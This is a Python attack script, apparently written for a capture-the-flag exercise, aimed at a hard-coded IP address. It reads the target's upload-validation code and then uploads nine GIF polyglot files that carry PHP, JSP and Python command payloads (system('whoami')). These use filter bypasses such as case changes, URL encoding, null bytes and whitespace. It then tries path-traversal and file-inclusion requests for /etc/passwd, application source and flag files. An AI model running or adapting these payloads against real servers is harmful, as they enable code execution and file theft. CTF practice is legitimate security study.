import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def analyze_source_code():
    """分析上传源码"""
    print_section("1. 分析上传源码")
    
    url = f"{TARGET}/upload-source"
    r = session.get(url, timeout=TIMEOUT)
    
    # 提取关键函数
    source = r.text
    
    # 提取ALLOWED_UPLOADS配置
    allowed_uploads = re.search(r'ALLOWED_UPLOADS\s*=\s*\{([^}]+)\}', source)
    if allowed_uploads:
        print(f"\n  ALLOWED_UPLOADS配置:\n{allowed_uploads.group(1)}")
    
    # 提取ALLOWED_UPLOAD_EXTENSIONS
    allowed_extensions = re.search(r'ALLOWED_UPLOAD_EXTENSIONS\s*=\s*\{([^}]+)\}', source)
    if allowed_extensions:
        print(f"\n  ALLOWED_UPLOAD_EXTENSIONS:\n{allowed_extensions.group(1)}")
    
    # 提取validate_image_payload函数
    validate_func = re.search(r'def validate_image_payload[^}]+return False', source)
    if validate_func:
        print(f"\n  validate_image_payload函数:\n{validate_func.group(0)}")
    
    # 提取detect_image_type函数
    detect_func = re.search(r'def detect_image_type[^}]+return None', source)
    if detect_func:
        print(f"\n  detect_image_type函数:\n{detect_func.group(0)}")


def test_upload_validation_bypass():
    """测试上传验证绕过"""
    print_section("2. 测试上传验证绕过")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 从源码分析，validate_image_payload会检查文件内容
    # 危险token: <?php, <script, <%, #!
    # 文件结尾验证: GIF以;结尾，PNG以IEND结尾，JPG以\xff\xd9结尾
    
    # 尝试各种绕过方式
    
    # 1. 危险token大小写混淆
    gif_with_php_upper = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?PHP system('whoami');?>"
    
    # 2. 危险token编码
    gif_with_encoded_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;%3C%3Fphp%20system('whoami');%3F%3E"
    
    # 3. 危险token分割
    gif_with_split_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php" + b" " + b"system('whoami');?>"
    
    # 4. 危险token使用注释
    gif_with_comment_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?php /* test */ system('whoami');?>"
    
    # 5. 危险token使用换行
    gif_with_newline_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?\nphp system('whoami');?>"
    
    # 6. 危险token使用制表符
    gif_with_tab_php = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<?\tphp system('whoami');?>"
    
    # 7. 使用其他脚本语言
    gif_with_jsp = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;<% out.println('test'); %>"
    
    # 8. 使用Python代码（因为服务器是Python）
    gif_with_python = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;#!python\nexec('import os; print(os.system(\"whoami\"))')"
    
    # 9. 空字节绕过
    gif_with_null_byte = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;\x00<?php system('whoami');?>"
    
    test_files = [
        ("test_upper.gif", "image/gif", gif_with_php_upper),
        ("test_encoded.gif", "image/gif", gif_with_encoded_php),
        ("test_split.gif", "image/gif", gif_with_split_php),
        ("test_comment.gif", "image/gif", gif_with_comment_php),
        ("test_newline.gif", "image/gif", gif_with_newline_php),
        ("test_tab.gif", "image/gif", gif_with_tab_php),
        ("test_jsp.gif", "image/gif", gif_with_jsp),
        ("test_python.gif", "image/gif", gif_with_python),
        ("test_null.gif", "image/gif", gif_with_null_byte),
    ]
    
    for filename, content_type, content in test_files:
        try:
            files = {"file": (filename, content, content_type)}
            r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                if "上传成功" in r.text:
                    uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
                    if uploaded_name:
                        print(f"\n  🎉 上传成功: {filename} -> /uploads/{uploaded_name.group(1)}")
                        
                        # 检查文件内容
                        r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                        print(f"     内容: {r2.text[:200]}")
                else:
                    notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
                    if notice:
                        print(f"\n  ❌ {filename}: {notice.group(1)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_python_code_execution():
    """测试Python代码执行"""
    print_section("3. 测试Python代码执行")
    
    # 由于服务器是Python，可能存在Python代码执行漏洞
    # 尝试通过各种方式执行Python代码
    
    # 测试文件包含是否可以执行Python代码
    include_url = f"{TARGET}/include"
    
    include_payloads = [
        "/etc/passwd",
        "/flag",
        "/flag.txt",
        "/app.py",
        "/main.py",
        "/config.py",
        "../flag",
        "../../flag",
        "../app.py",
        "../../app.py",
        "/uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
    ]
    
    for payload in include_payloads:
        try:
            r = session.get(include_url, params={"page": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:500]
                
                if "flag" in content.lower() or "python" in content.lower():
                    print(f"\n  [{r.status_code}] ?page={payload}")
                    print(f"     响应: {content}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_deep():
    """深入测试Backup功能"""
    print_section("4. 深入测试Backup")
    
    backup_url = f"{TARGET}/backup"
    
    # 尝试读取各种文件
    backup_payloads = [
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "F:\\small peoject\\python-lab\\app.py",
        "F:\\small peoject\\python-lab\\main.py",
        "F:\\small peoject\\python-lab\\config.py",
        "F:\\small peoject\\python-lab\\server.py",
        "F:\\small peoject\\python-lab\\database.py",
        "F:\\flag.txt",
        "F:\\flag",
        "F:\\app.py",
        "F:\\main.py",
        "C:\\flag.txt",
        "C:\\flag",
        "C:\\app.py",
        "C:\\main.py",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞分析")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    analyze_source_code()
    test_upload_validation_bypass()
    test_python_code_execution()
    test_backup_deep()
    
    print_section("分析完成")


if __name__ == "__main__":
    main()